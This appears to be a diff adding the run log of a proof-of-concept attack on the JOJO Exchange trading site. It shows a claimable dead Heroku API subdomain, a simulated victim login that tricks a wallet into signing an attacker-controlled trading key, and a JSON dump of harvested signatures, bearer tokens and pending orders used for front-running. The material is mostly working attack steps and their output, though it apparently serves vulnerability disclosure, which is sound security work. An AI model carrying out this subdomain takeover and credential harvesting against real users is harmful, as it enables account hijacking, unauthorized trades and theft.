@@ -1,0 +1,251 @@
+python3.11 poc_verify_dead_heroku.py
+python3.11 poc_simulate_victim.py
+curl -s http://localhost:5000/harvested | python3.11 -m json.tool
+======================================================================
+JOJO Exchange — Heroku App Takeover PoC (Dead Endpoint Verification)
+======================================================================
+
+[1] Fetching production bundle: https://app.jojo.exchange/static/js/main.69c4a863.js
+    OK: 1,959,524 bytes, bundle hash = main.69c4a863.js
+
+[2] Extracting production API config from bundle ...
+    wsDomain      = wss://orderly-stream.base-mainnet.jojo.exchange/v2
+    restfulDomain = https://jojo-api-mainnet-0da296028aeb.herokuapp.com/v2  ← TARGET
+
+[3] Production flag: Ge=true (pro mode active)
+
+[4] Bundle evidence checks:
+    ✅  Ge = true (pro mode hardcoded active)
+    ✅  herokuapp.com referenced in bundle
+    ✅  reducerPath jojoOrderlyApi (confirms IF = dead-Heroku API)
+    ✅  POST /private/signature signing endpoint
+    ✅  POST /temporary/orderlyKey (orderly-key source)
+    ✅  POST /authToken (auth + key registration)
+    ✅  Xe() whitelist: *.herokuapp.com explicitly trusted
+    ✅  7-day Bearer tokens stored + sent to restfulDomain
+
+[5] Probing dead Heroku app: https://jojo-api-mainnet-0da296028aeb.herokuapp.com
+    GET /                         → 🔴 UNCLAIMED  |  <!DOCTYPE html> <html>   <head>     <meta name="viewport" content="width=device-width, initial-scale=1">     <meta chars
+    GET /v2/public/info           → 🔴 UNCLAIMED  |  <!DOCTYPE html> <html>   <head>     <meta name="viewport" content="width=device-width, initial-scale=1">     <meta chars
+    GET /v2/authToken             → 🔴 UNCLAIMED  |  <!DOCTYPE html> <html>   <head>     <meta name="viewport" content="width=device-width, initial-scale=1">     <meta chars
+
+[6] Sending authenticated-style request to dead Heroku (simulating browser call):
+    POST /v2/temporary/orderlyKey            → HTTP 404 (<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-)
+    POST /v2/private/signature               → HTTP 404 (<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-)
+    POST /v2/authToken                       → HTTP 404 (<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-)
+
+======================================================================
+RESULT: ALL CHECKS PASSED — Heroku app is dead and claimable.
+        An attacker can register 'jojo-api-mainnet-0da296028aeb' on
+        Heroku and intercept ALL authentication and signing requests
+        from production JOJO Exchange users.
+======================================================================
+======================================================================
+JOJO Exchange — Victim Login Simulation (Attack Demonstration)
+======================================================================
+Victim wallet : 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+Attacker server: http://localhost:5000
+
+[Step 1] GET /v2/serverTime  (login preflight)
+         → serverTime = 1781141699346
+
+[Step 2] POST /v2/temporary/orderlyKey  ← INJECTION POINT
+         ← orderlyKey = ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA
+         ⚠  This is the ATTACKER'S key — not the victim's!
+
+[Step 3] Build EIP-712 message (victim about to sign)
+         message = {
+          "brokerId": "jojo",
+          "chainId": 8453,
+          "orderlyKey": "ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA",
+          "scope": "read,trading",
+          "timestamp": 1781141699346,
+          "expiration": 1812677699346
+}
+
+[Step 4] MetaMask 'Sign to log in' → victim clicks SIGN
+         signature = 0x77ba6dfb72a1754a781b1bfbb7ff6d5cc95071e9...dfe48afc1b
+         ⚠  Victim signed attacker's orderlyKey into the auth payload!
+
+[Step 5] POST /v2/authToken  ← ATTACKER RECEIVES SIGNATURE HERE
+         ← Bearer token = fake_bearer_84b32e588f0175404619dd4daf19...
+         ⚠  Attacker now has:
+              - Victim wallet: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+              - EIP-712 signature authorizing attacker's orderly key
+              - Scope: read,trading  /  Expiry: +1 year
+              → Can register on-chain, place orders for victim indefinitely
+
+[Step 6] POST /v2/private/signature  ← SIGNING ORACLE (front-run data)
+         Signing string sent: 1781141699500POST/v1/order{"symbol":"PERP_BTC_USDC","side":"BUY","orderType":"LIMIT","orderQuantity"...
+         ⚠  Attacker sees full order BEFORE it's submitted to Orderly
+              → Front-running opportunity: BUY 0.5 BTC @ 67000 USDC
+
+======================================================================
+ATTACK COMPLETE — check Terminal 1 (malicious server) for harvested data
+GET /harvested on the malicious server to view all captured credentials
+======================================================================
+{
+    "events": [
+        {
+            "data": {
+                "body": "",
+                "headers": {
+                    "Accept": "application/json",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "keep-alive",
+                    "Content-Type": "application/json",
+                    "Host": "localhost:5000",
+                    "Orderly-Account-Address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
+                    "Origin": "https://app.jojo.exchange",
+                    "Referer": "https://app.jojo.exchange/",
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                },
+                "method": "GET",
+                "path": "/v2/serverTime"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.333743,
+            "type": "raw_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "body": "{}",
+                "headers": {
+                    "Accept": "application/json",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "keep-alive",
+                    "Content-Length": "2",
+                    "Content-Type": "application/json",
+                    "Host": "localhost:5000",
+                    "Orderly-Account-Address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
+                    "Origin": "https://app.jojo.exchange",
+                    "Referer": "https://app.jojo.exchange/",
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                },
+                "method": "POST",
+                "path": "/v2/temporary/orderlyKey"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.395293,
+            "type": "raw_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "auth_token": "",
+                "chain_id": "",
+                "wallet": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.39585,
+            "type": "orderly_key_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "body": "{\"message\": {\"brokerId\": \"jojo\", \"chainId\": 8453, \"orderlyKey\": \"ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA\", \"scope\": \"read,trading\", \"timestamp\": 1781141699346, \"expiration\": 1812677699346}, \"signature\": \"0x77ba6dfb72a1754a781b1bfbb7ff6d5cc95071e91f7af30a9074dfb13aec0640725403b62fd15764bfff0307fa06e1f7321ed713a6464ae94f29db7cdfe48afc1b\", \"userAddress\": \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\", \"referralCode\": \"\"}",
+                "headers": {
+                    "Accept": "application/json",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "keep-alive",
+                    "Content-Length": "431",
+                    "Content-Type": "application/json",
+                    "Host": "localhost:5000",
+                    "Orderly-Account-Address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
+                    "Origin": "https://app.jojo.exchange",
+                    "Referer": "https://app.jojo.exchange/",
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                },
+                "method": "POST",
+                "path": "/v2/authToken"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.467503,
+            "type": "raw_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "eip712_signature": "0x77ba6dfb72a1754a781b1bfbb7ff6d5cc95071e91f7af30a9074dfb13aec0640725403b62fd15764bfff0307fa06e1f7321ed713a6464ae94f29db7cdfe48afc1b",
+                "expiration_ms": 1812677699346,
+                "full_message": {
+                    "brokerId": "jojo",
+                    "chainId": 8453,
+                    "expiration": 1812677699346,
+                    "orderlyKey": "ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA",
+                    "scope": "read,trading",
+                    "timestamp": 1781141699346
+                },
+                "orderly_key_being_registered": "ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA",
+                "scope": "read,trading",
+                "wallet": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.470051,
+            "type": "auth_token_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "body": "1781141699500POST/v1/order{\"symbol\":\"PERP_BTC_USDC\",\"side\":\"BUY\",\"orderType\":\"LIMIT\",\"orderQuantity\":\"0.5\",\"orderPrice\":\"67000\",\"clientOrderId\":\"5da629d2f081fd29\"}",
+                "headers": {
+                    "Accept": "application/json",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Authorization": "Bearer fake_bearer_84b32e588f0175404619dd4daf193112",
+                    "Connection": "keep-alive",
+                    "Content-Length": "163",
+                    "Content-Type": "text/plain",
+                    "Host": "localhost:5000",
+                    "Orderly-Account-Address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
+                    "Origin": "https://app.jojo.exchange",
+                    "Referer": "https://app.jojo.exchange/",
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                },
+                "method": "POST",
+                "path": "/v2/private/signature"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.552843,
+            "type": "raw_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "auth_token": "Bearer fake_bearer_84b32e588f0175404619dd4daf193112",
+                "string_to_sign": "1781141699500POST/v1/order{\"symbol\":\"PERP_BTC_USDC\",\"side\":\"BUY\",\"orderType\":\"LIMIT\",\"orderQuantity\":\"0.5\",\"orderPrice\":\"67000\",\"clientOrderId\":\"5da629d2f081fd29\"}",
+                "wallet": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.553944,
+            "type": "signing_oracle_request",
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        },
+        {
+            "data": {
+                "body": "",
+                "headers": {
+                    "Accept": "*/*",
+                    "Host": "localhost:5000",
+                    "User-Agent": "curl/8.7.1"
+                },
+                "method": "GET",
+                "path": "/harvested"
+            },
+            "ip": "127.0.0.1",
+            "time": 1781141699.863022,
+            "type": "raw_request",
+            "ua": "curl/8.7.1"
+        }
+    ],
+    "total_events": 8
+}
